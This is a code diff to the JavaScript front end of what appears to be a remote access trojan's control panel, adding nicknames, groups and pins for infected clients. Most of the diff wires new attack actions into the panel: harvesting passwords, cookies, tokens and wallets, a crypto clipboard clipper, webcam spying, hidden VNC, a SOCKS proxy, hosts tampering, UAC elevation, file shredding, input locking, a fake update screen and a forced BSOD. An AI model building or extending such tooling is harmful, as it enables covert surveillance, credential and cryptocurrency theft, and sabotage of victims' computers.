@@ -11,7 +11,7 @@
     lastDetail: null,
     control: false, downBtn: null, lastMove: 0,
     inPreview: false, sysTimer: null,
-    thumbs: {}, screenUrl: null,
+    thumbs: {}, screenUrl: null, editing: null,
   };
 
   const ICON = {
@@ -77,7 +77,7 @@
   // ------------------------------------------------------------------
   function sig(a) {
     return [a.host, a.user, a.id, a.ip, a.os_short, a.arch, a.monitors, a.cpu, a.ram,
-            a.admin, a.cc, a.ver].join('|');
+            a.admin, a.cc, a.ver, a.nickname, a.grp, a.note, a.pinned].join('|');
   }
 
   function cardHTML(a) {
@@ -87,8 +87,8 @@
         ${online ? `<img src="/api/agents/${a.id}/preview.jpg?n=${a.frame}" alt="">` : ''}
         <div class="ghost">${online ? '' : 'offline'}</div>
         <div class="thumb-actions">
-          <button data-act="pin" title="pin">${ICON.star}</button>
-          <button data-act="menu" title="actions">${ICON.dots}</button>
+          <button data-act="pin" class="${a.pinned ? 'on' : ''}" title="pin">${ICON.star}</button>
+          <button data-act="menu" title="edit client">${ICON.dots}</button>
         </div>
         <div class="thumb-bar">
           <span class="live ${online ? '' : 'offline'}"><i></i>${online ? 'Online' : 'Offline'}
@@ -99,11 +99,12 @@
       <div class="body">
         <div class="row title">
           <span class="flag">${esc(a.cc || '??')}</span>
-          <b>${esc(a.host || 'unknown')}</b>
+          <b>${esc(a.nickname || a.host || 'unknown')}</b>
+          ${a.grp ? `<span class="badge grp">${esc(a.grp)}</span>` : ''}
           ${a.admin ? '<span class="badge">admin</span>' : ''}
           ${ICON.shield}
         </div>
-        <div class="row sub">${ICON.user}${esc(a.user || '—')}</div>
+        <div class="row sub">${ICON.user}${esc(a.user || '—')}${a.nickname && a.host ? ' · ' + esc(a.host) : ''}</div>
         <div class="row ids">
           <span>${esc(a.ip || '—')}</span><span class="dot"></span><span>${esc(a.id.slice(0, 8))}</span>
         </div>
@@ -154,6 +155,7 @@
     }
     el.classList.toggle('off', !a.online);
     el.classList.toggle('sel', S.selection.has(a.id));
+    el.classList.toggle('pinned', !!a.pinned);
     const live = el.querySelector('.live');
     if (live) {
       live.classList.toggle('offline', !a.online);
@@ -171,13 +173,14 @@
     return list.filter((a) => {
       if (S.onlineOnly && !a.online) return false;
       if (!q) return true;
-      return [a.host, a.user, a.id, a.ip, a.os_short, a.cpu].join(' ').toLowerCase().includes(q);
+      return [a.host, a.user, a.id, a.ip, a.os_short, a.cpu, a.nickname, a.grp].join(' ').toLowerCase().includes(q);
     });
   }
 
   function sortList(list) {
     const key = S.sort;
     return [...list].sort((a, b) => {
+      if (!!b.pinned !== !!a.pinned) return (b.pinned ? 1 : 0) - (a.pinned ? 1 : 0);
       if (key === 'online') return (b.online - a.online) || (a.host || '').localeCompare(b.host || '');
       if (key === 'ping') return (a.ping ?? 9999) - (b.ping ?? 9999);
       return (a.host || '').localeCompare(b.host || '');
@@ -212,6 +215,22 @@
     } catch {}
   }
 
+  async function patchMeta(id, fields) {
+    try {
+      const r = await api(`/api/agents/${encodeURIComponent(id)}/meta`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(fields),
+      });
+      if (r && r.agent) {
+        const i = S.agents.findIndex((x) => x.id === id);
+        if (i >= 0) S.agents[i] = { ...S.agents[i], ...r.agent };
+        render();
+      }
+      return r;
+    } catch (e) { toast(e.message); return null; }
+  }
+
   // ------------------------------------------------------------------
   // modal
   // ------------------------------------------------------------------
@@ -222,12 +241,15 @@
     if (!a) return;
     S.sel = id;
     $('#modal').classList.remove('hidden');
-    $('#mHost').textContent = a.host || 'unknown';
-    $('#mMeta').textContent = [a.user, a.os, a.ip, a.id.slice(0, 8)].filter(Boolean).join('  ·  ');
+    $('#mHost').textContent = a.nickname || a.host || 'unknown';
+    $('#mMeta').textContent = [a.grp, a.user, a.os, a.ip, a.id.slice(0, 8)].filter(Boolean).join('  ·  ');
     $('#mPing').textContent = fmtPing(a.ping);
+    fillMonitors(a.monitors);
     $('#term').innerHTML = '';
     $('#keyOut').textContent = '';
     $('#sysOut').textContent = '';
+    $('#spyOut').textContent = '';
+    $('#toolOut').textContent = '';
     $('#audioWrap').innerHTML = '';
     $('#screenImg').removeAttribute('src');
     $('#screenEmpty').classList.remove('hidden');
@@ -279,16 +301,31 @@
     }
   }
 
+  function previewOpts() {
+    return {
+      action: 'set',
+      fps: +$('#pvFps').value || 15,
+      width: +$('#pvWidth').value || 1280,
+      quality: +$('#pvQuality').value || 60,
+      monitor: +$('#pvMonitor').value,
+      paused: false,
+    };
+  }
+
+  function fillMonitors(count) {
+    const sel = $('#pvMonitor');
+    if (!sel) return;
+    const cur = sel.value;
+    let html = '<option value="-1">all</option>';
+    for (let i = 0; i < Math.max(1, count | 0); i++) html += `<option value="${i}">${i + 1}</option>`;
+    sel.innerHTML = html;
+    sel.value = [...sel.options].some((o) => o.value === cur) ? cur : '-1';
+  }
+
   function enterPreview() {
     if (S.inPreview || !S.sel) return;
     S.inPreview = true;
-    sendSilent('preview', {
-      action: 'set',
-      interval_ms: +$('#pvInterval').value,
-      width: +$('#pvWidth').value,
-      quality: 55,
-      paused: false,
-    });
+    sendSilent('preview', previewOpts());
   }
 
   function leavePreview() {
@@ -310,12 +347,9 @@
     $('#ctlDot')?.classList.toggle('hidden', !on);
     if (on) $('#screenWrap')?.focus();
     if (!quiet && S.sel) {
-      sendSilent('preview', {
-        action: 'set',
-        interval_ms: on ? Math.min(250, +$('#pvInterval').value) : +$('#pvInterval').value,
-        width: +$('#pvWidth').value,
-        quality: on ? 60 : 55,
-      });
+      const opts = previewOpts();
+      if (on) { opts.fps = 30; opts.quality = Math.max(opts.quality, 75); }
+      sendSilent('preview', opts);
     }
     if (!on) S.downBtn = null;
   }
@@ -332,12 +366,27 @@
     while (box.childElementCount > 2500) box.removeChild(box.firstChild);
   }
 
+  function toolOut(module) {
+    if (['creds', 'clipper', 'webcam'].includes(module)) return $('#spyOut');
+    if (['netscan', 'socks', 'hosts', 'hvnc', 'flip', 'shellui', 'cdtray',
+         'openurl', 'shred', 'uac', 'update', 'persist', 'inputlock',
+         'overlay'].includes(module)) return $('#toolOut');
+    return null;
+  }
+
   function renderBody(body, module) {
     if (!body) return;
     if (body.stdout) term(body.stdout.replace(/\s+$/, ''), 'out');
     if (body.stderr) term(body.stderr.replace(/\s+$/, ''), 'err');
     if (body.error) term(body.error, 'err');
     if (module === 'sysinfo') renderStats(null, body.meta);
+
+    const box = toolOut(module);
+    if (box) {
+      const text = [body.stdout, body.stderr, body.error]
+        .filter(Boolean).join('\n').replace(/\s+$/, '');
+      if (text) box.textContent = text;
+    }
   }
 
   function renderStats(agent, meta) {
@@ -684,7 +733,11 @@
     $('#mClose').addEventListener('click', closeModal);
     $('#modal').addEventListener('click', (e) => { if (e.target.id === 'modal') closeModal(); });
     document.addEventListener('keydown', (e) => {
-      if (e.key === 'Escape') { $('#lightbox').classList.add('hidden'); if (!$('#modal').classList.contains('hidden')) closeModal(); }
+      if (e.key === 'Escape') {
+        $('#lightbox').classList.add('hidden');
+        if (!$('#clientModal').classList.contains('hidden')) closeClientEditor();
+        else if (!$('#modal').classList.contains('hidden')) closeModal();
+      }
     });
     $('#lightbox').addEventListener('click', () => $('#lightbox').classList.add('hidden'));
   }
@@ -704,8 +757,8 @@
         return;
       }
       if (act === 'pin') {
-        S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id);
-        render();
+        const a = agentById(id);
+        patchMeta(id, { pinned: !(a && a.pinned) });
         return;
       }
       if (act === 'kill') {
@@ -716,7 +769,7 @@
         }).then(() => toast('terminate sent')).catch((err) => toast(err.message));
         return;
       }
-      if (act === 'menu') { S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id); render(); return; }
+      if (act === 'menu') { openClientEditor(id); return; }
 
       if (S.selection.size) {
         S.selection.has(id) ? S.selection.delete(id) : S.selection.add(id);
@@ -739,6 +792,12 @@
       ['wifi', 'wifi', { action: 'profiles' }],
       ['software', 'software'], ['startup', 'startup'], ['net', 'net'],
       ['clipboard', 'clipboard', { action: 'get' }],
+      ['harvest all', 'creds', { action: 'all' }],
+      ['webcam', 'webcam', {}],
+      ['netscan', 'netscan', {}],
+      ['socks5 start', 'socks', { action: 'start', port: 1080 }],
+      ['hosts get', 'hosts', { action: 'get' }],
+      ['hvnc start', 'hvnc', { action: 'start' }],
     ];
     $('#quick').innerHTML = items
       .map(([label], i) => `<button class="qbtn" data-q="${i}">${esc(label)}</button>`).join('');
@@ -760,6 +819,15 @@
       ['popup', 'msgbox', { title: 'Windows', text: 'system maintenance' }],
       ['search *.txt', 'search', { path: 'C:\\Users', pattern: '*.txt', max: 200 }],
       ['registry HKCU Run', 'registry', { action: 'get', key: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' }],
+      ['flip display', 'flip', { rotation: '180' }],
+      ['hide taskbar', 'shellui', { action: 'hide', what: 'all' }],
+      ['show taskbar', 'shellui', { action: 'show', what: 'all' }],
+      ['blackout', 'overlay', { action: 'blackout' }],
+      ['fake update', 'overlay', { action: 'update' }],
+      ['lock input', 'inputlock', { action: 'on' }],
+      ['unlock input', 'inputlock', { action: 'off' }],
+      ['cd tray', 'cdtray', { action: 'open' }],
+      ['bsod', 'bsod', {}],
     ];
     $('#sysQuick').innerHTML = sys
       .map(([label], i) => `<button class="qbtn" data-s="${i}">${esc(label)}</button>`).join('');
@@ -769,6 +837,47 @@
       const [label, mod, args] = sys[+b.dataset.s];
       run(mod, args, label);
     };
+  }
+
+  function openClientEditor(id) {
+    const a = agentById(id);
+    if (!a) return;
+    S.editing = id;
+    $('#ceWho').textContent = [a.host, a.user, a.id.slice(0, 8)].filter(Boolean).join(' · ');
+    $('#ceNick').value = a.nickname || '';
+    $('#ceGrp').value = a.grp || '';
+    $('#ceNote').value = a.note || '';
+    $('#cePin').checked = !!a.pinned;
+    const groups = [...new Set(S.agents.map((x) => x.grp).filter(Boolean))];
+    $('#ceGrpList').innerHTML = groups.map((g) => `<option value="${esc(g)}">`).join('');
+    $('#clientModal').classList.remove('hidden');
+    $('#ceNick').focus();
+  }
+
+  function closeClientEditor() {
+    $('#clientModal').classList.add('hidden');
+    S.editing = null;
+  }
+
+  async function saveClientEditor() {
+    if (!S.editing) return;
+    const fields = {
+      nickname: $('#ceNick').value.trim(),
+      grp: $('#ceGrp').value.trim(),
+      note: $('#ceNote').value.trim(),
+      pinned: $('#cePin').checked,
+    };
+    await patchMeta(S.editing, fields);
+    closeClientEditor();
+    toast('client updated');
+  }
+
+  function wireClientEditor() {
+    $('#ceClose').addEventListener('click', closeClientEditor);
+    $('#ceCancel').addEventListener('click', closeClientEditor);
+    $('#ceSave').addEventListener('click', saveClientEditor);
+    $('#clientModal').addEventListener('click', (e) => { if (e.target.id === 'clientModal') closeClientEditor(); });
+    $('#ceNick').addEventListener('keydown', (e) => { if (e.key === 'Enter') { e.preventDefault(); saveClientEditor(); } });
   }
 
   function wireScreenControls() {
@@ -950,21 +1059,75 @@
         $('#keyOut').textContent = '';
         run('keylog', { action: 'clear' }, 'keylog clear');
       }
+
+      // ---- input lock + overlay --------------------------------------
+      if (act === 'input-lock') run('inputlock', { action: 'on' }, 'lock user input');
+      if (act === 'input-unlock') run('inputlock', { action: 'off' }, 'restore user input');
+      if (act === 'overlay-blackout') run('overlay', { action: 'blackout' }, 'blackout screen');
+      if (act === 'overlay-update') run('overlay', { action: 'update' }, 'fake update screen');
+      if (act === 'overlay-off') run('overlay', { action: 'off' }, 'close overlay');
+
+      // ---- spy --------------------------------------------------------
+      if (act === 'webcam') run('webcam', { index: +$('#camIndex').value || 0 }, 'webcam capture');
+      if (act === 'clipper-start') run('clipper', { action: 'start' }, 'clipper on');
+      if (act === 'clipper-stop') run('clipper', { action: 'stop' }, 'clipper off');
+      if (act === 'clipper-status') run('clipper', { action: 'status' }, 'clipper status');
+      if (act === 'clipper-set') run('clipper', {
+        action: 'set', coin: $('#clCoin').value, address: $('#clAddr').value.trim(),
+      }, 'clipper set address');
+      if (act === 'creds-browsers') run('creds', { action: 'browsers' }, 'harvest passwords');
+      if (act === 'creds-cookies') run('creds', { action: 'cookies' }, 'harvest cookies');
+      if (act === 'creds-tokens') run('creds', { action: 'tokens' }, 'harvest tokens');
+      if (act === 'creds-wallets') run('creds', { action: 'wallets' }, 'harvest wallets');
+      if (act === 'creds-keys') run('creds', { action: 'keys' }, 'read product keys');
+      if (act === 'creds-all') run('creds', { action: 'all' }, 'harvest everything');
+
+      // ---- network ----------------------------------------------------
+      if (act === 'netscan') run('netscan', {
+        arp_only: $('#nsArp').checked, ports: $('#nsPorts').value.trim(),
+      }, 'scan network');
+      if (act === 'socks-start') run('socks', { action: 'start', port: +$('#socksPort').value || 1080 }, 'socks5 start');
+      if (act === 'socks-stop') run('socks', { action: 'stop' }, 'socks5 stop');
+      if (act === 'socks-status') run('socks', { action: 'status' }, 'socks5 status');
+      if (act === 'hosts-get') run('hosts', { action: 'get' }, 'read hosts');
+      if (act === 'hosts-backup') run('hosts', { action: 'backup' }, 'backup hosts');
+      if (act === 'hosts-restore') run('hosts', { action: 'restore' }, 'restore hosts');
+      if (act === 'hosts-add') run('hosts', {
+        action: 'add', ip: $('#hostsIp').value.trim() || '0.0.0.0', host: $('#hostsHost').value.trim(),
+      }, 'add hosts entry');
+      if (act === 'hosts-remove') run('hosts', {
+        action: 'remove', host: $('#hostsHost').value.trim(),
+      }, 'remove hosts entry');
+
+      // ---- desktop ----------------------------------------------------
+      if (act === 'flip-180') run('flip', { rotation: '180' }, 'flip display 180');
+      if (act === 'flip-90') run('flip', { rotation: '90' }, 'rotate display 90');
+      if (act === 'flip-0') run('flip', { rotation: '0' }, 'reset display');
+      if (act === 'shellui-hide') run('shellui', { action: 'hide', what: 'all' }, 'hide icons + taskbar');
+      if (act === 'shellui-show') run('shellui', { action: 'show', what: 'all' }, 'show icons + taskbar');
+      if (act === 'cdtray-open') run('cdtray', { action: 'open' }, 'open cd tray');
+      if (act === 'cdtray-close') run('cdtray', { action: 'close' }, 'close cd tray');
+
+      // ---- misc -------------------------------------------------------
+      if (act === 'openurl') run('openurl', { url: $('#openUrl').value.trim() }, 'open url');
+      if (act === 'shred') run('shred', { path: $('#shredPath').value.trim() }, 'shred path');
+      if (act === 'uac') run('uac', { command: $('#uacCmd').value.trim() }, 'elevate via uac');
+      if (act === 'update') run('update', { url: $('#updUrl').value.trim() }, 'self update');
+      if (act === 'bsod') {
+        if (confirm('trigger a real bugcheck (BSOD) on this machine?')) run('bsod', {}, 'trigger bsod');
+      }
+
+      // ---- hidden desktop --------------------------------------------
+      if (act === 'hvnc-start') run('hvnc', { action: 'start' }, 'hvnc start');
+      if (act === 'hvnc-launch') run('hvnc', { action: 'launch', path: 'cmd.exe' }, 'hvnc launch cmd');
+      if (act === 'hvnc-list') run('hvnc', { action: 'list' }, 'hvnc list');
+      if (act === 'hvnc-capture') run('hvnc', { action: 'capture', index: 0 }, 'hvnc capture');
+      if (act === 'hvnc-close') run('hvnc', { action: 'close' }, 'hvnc close');
     });
 
-    const previewOpts = () => ({
-      action: 'set',
-      interval_ms: +$('#pvInterval').value,
-      width: +$('#pvWidth').value,
-      quality: S.control ? 60 : 55,
-      paused: false,
-    });
-
-    $('#pvInterval').addEventListener('change', () => {
-      if (S.inPreview) sendSilent('preview', previewOpts());
-    });
-    $('#pvWidth').addEventListener('change', () => {
-      if (S.inPreview) sendSilent('preview', previewOpts());
+    ['#pvFps', '#pvQuality', '#pvWidth', '#pvMonitor'].forEach((sel) => {
+      const el = $(sel);
+      if (el) el.addEventListener('change', () => { if (S.inPreview) sendSilent('preview', previewOpts()); });
     });
 
     wireScreenControls();
@@ -1063,8 +1226,9 @@
         if (idx >= 0) S.agents[idx] = { ...S.agents[idx], ...a };
         else S.agents.push(a);
         render();
-        if (a.id === S.sel && $('#mHost').textContent !== a.host) {
-          $('#mHost').textContent = a.host || 'unknown';
+        if (a.id === S.sel) {
+          const label = a.nickname || a.host || 'unknown';
+          if ($('#mHost').textContent !== label) $('#mHost').textContent = label;
         }
         return;
       }
@@ -1135,6 +1299,7 @@
   wireToolbar();
   wireGrid();
   wireModal();
+  wireClientEditor();
   wireSysProcs();
   quickButtons();
   loadState();
